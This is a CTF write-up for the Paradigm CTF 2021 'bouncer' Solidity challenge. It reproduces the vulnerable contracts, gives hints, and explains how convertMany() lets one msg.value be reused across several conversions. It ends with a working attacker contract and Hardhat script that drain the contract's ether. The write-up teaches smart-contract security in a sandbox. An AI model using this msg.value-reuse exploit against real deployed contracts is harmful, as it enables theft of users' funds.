---
layout: post
title: 'Paradigm CTF 2021: bouncer'
category: Paradigm CTF 2021
excerpt_separator:  <!--more-->
---

### Challenge:
This write-up is for the challenge titled 'bouncer'.


This challenge is located in the bouncer/public/ directory. The source code can be found below:

<details>
<summary> Bouncer.sol:</summary>
<br>
<div markdown="1">
```
pragma solidity 0.8.0;

interface ERC20Like {
    function transfer(address dst, uint qty) external returns (bool);
    function transferFrom(address src, address dst, uint qty) external returns (bool);
    function approve(address dst, uint qty) external returns (bool);
    function allowance(address src, address dst) external returns (uint256);
    function balanceOf(address who) external view returns (uint);
}

contract Bouncer {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant entryFee = 1 ether;

    address owner;
    constructor() payable {
        owner = msg.sender;
    }

    mapping (address => address) public delegates;
    mapping (address => mapping (address => uint256)) public tokens;
    struct Entry {
        uint256 amount;
        uint256 timestamp;
        ERC20Like token;
    }
    mapping (address => Entry[]) entries;


    // declare intent to enter
    function enter(address token, uint256 amount) public payable {
        require(msg.value == entryFee, "err fee not paid");
        entries[msg.sender].push(Entry ({
            amount: amount,
            token: ERC20Like(token),
            timestamp: block.timestamp
        }));
    }

    function convertMany(address who, uint256[] memory ids) payable public {
        for (uint256 i = 0; i < ids.length; i++) {
            convert(who, ids[i]);
        }
    }

    // use the returned number to gatekeep
    function contributions(address who, address[] memory coins) public view returns (uint256[] memory) {
        uint256[] memory res = new uint256[](coins.length);
        for (uint256 i = 0; i < coins.length; i++) {
            res[i] = tokens[who][coins[i]];
        }
        return res;
    }

    // convert your erc20s to tokens
    function convert(address who, uint256 id) payable public {
        Entry memory entry = entries[who][id];
        require(block.timestamp != entry.timestamp, "err/wait after entering");
        if (address(entry.token) != ETH) {
            require(entry.token.allowance(who, address(this)) == type(uint256).max, "err/must give full approval");
        }
        require(msg.sender == who || msg.sender == delegates[who]);
        proofOfOwnership(entry.token, who, entry.amount);
        tokens[who][address(entry.token)] += entry.amount;
    }

    // redeem your tokens for their underlying erc20
    function redeem(ERC20Like token, uint256 amount) public {
        tokens[msg.sender][address(token)] -= amount;
        payout(token, msg.sender, amount);
    }

    function payout(ERC20Like token, address to, uint256 amount) private {
        if (address(token) == ETH) {
            payable(to).transfer(amount);
        } else {
            require(token.transfer(to, amount), "err/not enough tokens");
        }
    }

    function proofOfOwnership(ERC20Like token, address from, uint256 amount) public payable {
        if (address(token) == ETH) {
            require(msg.value == amount, "err/not enough tokens");
        } else {
            require(token.transferFrom(from, address(this), amount), "err/not enough tokens");
        }
    }

    function addDelegate(address from, address to) public {
        require(msg.sender == owner || msg.sender == from);
        delegates[from] = to;
    }

    function removeDelegate(address from) public {
        require(msg.sender == owner || msg.sender == from);
        delete delegates[from];
    }

    // get all the fees given during registration
    function claimFees() public {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }

    // owner can trigger arbitrary calls
    function hatch(address target, bytes memory data) public {
        require(msg.sender == owner);
        (bool ok, bytes memory res) = target.delegatecall(data);
        require(ok, string(res));
    }
}

contract Party {
    Bouncer bouncer;
    constructor(Bouncer _bouncer) {
        bouncer = _bouncer;
    }

    function isAllowed(address who) public view returns (bool) {
        address[] memory res = new address[](2);
        res[0] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        res[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        uint256[] memory contribs = bouncer.contributions(who, res);
        uint256 sum;
        for (uint256 i = 0; i < contribs.length; i++) {
            sum += contribs[i];
        }
        return sum > 1000 * 1 ether;
    }
}

```
</div>
</details>

<details>
<summary> Setup.sol:</summary>
<br>
<div markdown="1">
```
pragma solidity 0.8.0;

import "./Bouncer.sol";

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

contract Setup {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Bouncer public bouncer;
    Party public party;

    constructor() payable {
        require(msg.value == 100 ether);
        // give some cash to the bouncer for his drinks
        bouncer = new Bouncer{value: 50 ether}();

        // 2 * eth
        bouncer.enter{value: 1 ether}(address(weth), 10 ether);
        bouncer.enter{value: 1 ether}(ETH, 10 ether);

        party = new Party(bouncer);
    }

    function isSolved() public view returns (bool) {
        return address(bouncer).balance == 0;
    }
}

```
</div>
</details>


The hints and solutions for this level can be found below:

<details>
<summary> Hint 1:</summary>
<br>
<div markdown="1">
Pay once, get several uses!
</div>
</details>

<details>
<summary> Hint 2:</summary>
<br>
<div markdown="1">
How is msg.value tracked between function calls made inside of a loop?
</div>
</details>

The solution for this level can be found below:

<details>
<summary> Solution:</summary>
<br>
<div markdown="1">
The issue here comes in two parts:
1. The `proofOfOwnership()` function logic depends on the msg.value of being unique to the transaction in order to enforce a conversion amount. 
2. The `convertMany()` function performs several conversions in the same transaction, allowing us to reuse the msg.value amount.

Basically, we can convert several entries in a single `convertMany()` call while only supplying the appropriate value for one of them. In order to do this, we will create 7 entries with the token type being ETH and the token amount being 10 ether. Each entry costs 1 Ether on its face, so we have so far put 7 ether into the contract.

Next, we will call convertMany() with a msg.value of 10 eth and pass it all 7 entry ids we created. We have now put 17 ether into the contract but we have been credited with 70 ETH tokens.

Finally, we will redeem our ETH tokens for ether and we can drain the entire contract in one transaction (the contract was initialized with 50 ether, then two entries were made by the deployer for 1 ether each, and we placed 17 ether in ourselves for a total of 69 ether in the contract).
</div>
</details>

<details>
<summary> Hardhat Challenge:</summary>
<br>
<div markdown="1">
```
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] bouncer', function () {

    before(async function () {
        /** SETUP */
        [deployer, attacker] = await ethers.getSigners();

        const Setup = await ethers.getContractFactory('SetupBouncer', deployer);
        this.setup = await Setup.deploy({value: ethers.utils.parseEther('100')});

        const Bouncer = await ethers.getContractFactory('Bouncer', deployer);
        this.bouncer = await Bouncer.attach(await this.setup.bouncer());

        expect(
            await ethers.provider.getBalance(this.bouncer.address)
        ).to.equal(ethers.utils.parseEther('52'));

        const Party = await ethers.getContractFactory('Party', deployer);
        this.party = await Party.attach(await this.setup.party());

        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('10000'));

    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await this.setup.isSolved()
        ).to.equal(true);

        expect(
            await ethers.provider.getBalance(this.bouncer.address)
        ).to.equal(ethers.utils.parseEther('0'));

        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('10050'));

    });
});


```
</div>
</details>

<details>
<summary> Contract Solution:</summary>
<br>
<div markdown="1">
```
pragma solidity 0.8.0;
import "./SetupBouncer.sol";

contract BouncerAttacker {

Bouncer public bouncer;
SetupBouncer public setup;
address private attacker;
address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
uint256 public counter;
uint256[] public ids;
ERC20Like public eth_token;
    constructor(address _setup, address _bouncer, address _attacker) {
        bouncer = Bouncer(_bouncer);
        setup = SetupBouncer(_setup);
        eth_token = ERC20Like(ETH);
        attacker = _attacker;
    }

    function makeEntry() public payable {
        require(msg.value == 1 ether);
        bouncer.enter{value: msg.value}(ETH, 10 ether);
        ids.push(counter); 
        ++counter;
    }
    function attack() public payable {
        require(msg.value == 10 ether);
        require(ids.length == 7);
        bouncer.convertMany{value: msg.value}(address(this), ids);
        bouncer.redeem(eth_token, 69 ether);
        payAttacker();
    }

    receive() external payable {
    }

    function payAttacker() public payable {
        payable(attacker).transfer(50 ether);
    }

}
```
</div>
</details>

<details>
<summary> HardHat Solution:</summary>
<br>
<div markdown="1">
```
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const BouncerAttacker = await ethers.getContractFactory('BouncerAttacker', deployer);
        this.bouncerAttacker = await BouncerAttacker.deploy(this.setup.address, this.bouncer.address, attacker.address);

        for (let i = 0; i < 7; i++) {
            await this.bouncerAttacker.makeEntry({value: ethers.utils.parseEther('1')});
        }
        expect(
            await ethers.provider.getBalance(this.bouncer.address)
        ).to.equal(ethers.utils.parseEther('59'));

        await this.bouncerAttacker.attack({value: ethers.utils.parseEther('10')});
        
        expect(
            await ethers.provider.getBalance(this.bouncer.address)
        ).to.equal(ethers.utils.parseEther('0'));

    });
```
</div>
</details>


